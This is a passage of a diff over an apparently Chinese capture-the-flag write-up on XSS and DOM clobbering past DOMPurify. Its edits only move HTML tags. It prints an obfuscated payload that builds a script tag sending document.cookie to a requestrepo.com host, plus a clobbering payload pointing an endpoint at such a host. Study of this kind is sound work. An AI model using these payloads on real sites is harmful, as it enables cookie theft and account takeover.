 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">$</span><span class="p">{</span><span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">60</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span> <span class="o">%</span> <span class="mi">115</span> <span class="o">+</span><span class="s1">&#39;cript&#39;</span> <span class="o">+</span> <span class="nx">banned</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;fetch&#39;</span> <span class="o">+</span> <span class="nx">banned</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;`http&#39;</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">115</span> <span class="o">+</span> <span class="s1">&#39;://drzgmowg&#39;</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">46</span> <span class="o">+</span> <span class="s1">&#39;reque&#39;</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">115</span> <span class="o">+</span> <span class="s1">&#39;trepo&#39;</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">46</span> <span class="o">+</span> <span class="s1">&#39;com/?a=&#39;</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span> <span class="o">%</span> <span class="mi">36</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">123</span> <span class="o">+</span> <span class="s1">&#39;document&#39;</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">46</span> <span class="o">+</span> <span class="s1">&#39;cookie&#39;</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span> <span class="o">%</span> <span class="mi">125</span> <span class="o">+</span> <span class="s1">&#39;`&#39;</span> <span class="o">+</span> <span class="nx">banned</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span><span class="o">%</span><span class="mi">60</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span> <span class="o">%</span> <span class="mi">47</span> <span class="o">+</span> <span class="s1">&#39;%c&#39;</span> <span class="o">%</span> <span class="mi">115</span> <span class="o">+</span><span class="s1">&#39;cript&#39;</span> <span class="o">+</span> <span class="nx">banned</span><span class="p">[</span><span class="mi">2</span><span class="p">]}</span>
 </span></span></code></pre></div><h2 id="dom-notify">DOM NOTIFY</h2>
 <p>可能是DOM破坏?</p>
-<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">DOM clobbering | Web Security Academy</a></p>
+<p><a href="https://portswigger.net/web-security/dom-based/dom-clobbering">DOM clobbering | Web Security Academy</a>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">id</span><span class="o">=</span><span class="nx">custom_elements</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">id</span><span class="o">=</span><span class="nx">custom_elements</span> <span class="nx">name</span><span class="o">=</span><span class="nx">enabled</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">id</span><span class="o">=</span><span class="nx">custom_elements</span> <span class="nx">name</span><span class="o">=</span><span class="nx">endpoint</span> <span class="nx">href</span><span class="o">=</span><span class="c1">//kws1oh3y.requestrepo.com&gt;
 </span></span></span></code></pre></div><p>很好,我们现在能向任意网站获得数据了,我们继续</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[{</span><span class="s2">&#34;name&#34;</span><span class="o">:</span><span class="s2">&#34;title-div&#34;</span><span class="p">,</span><span class="s2">&#34;observedAttribute&#34;</span><span class="o">:</span><span class="s2">&#34;data-id&#34;</span><span class="p">}]</span>
-</span></span></code></pre></div><p>如果我们监听这种全局属性性呢？<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Global_attributes/data-*">data-*</a></p>
+</span></span></code></pre></div><p>如果我们监听这种全局属性性呢？<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Global_attributes/data-*">data-*</a>
+</p>
 <p>我发现DOMPurify认为data-id与id都是被允许的,不会删除此属性!</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">ALLOWED_ATTR</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;class&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;href&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">]</span>
-</span></span></code></pre></div><p><a href="https://jorianwoltjer.com/blog/p/research/mutation-xss">突变 XSS：解释、CVE 和挑战 |乔里安·沃尔特杰</a></p>
+</span></span></code></pre></div><p><a href="https://jorianwoltjer.com/blog/p/research/mutation-xss">突变 XSS：解释、CVE 和挑战 |乔里安·沃尔特杰</a>
+</p>
 <blockquote>
 <p>因为特殊原因 DOMPurify 在有些情况无法清理is属性？</p>
 </blockquote>
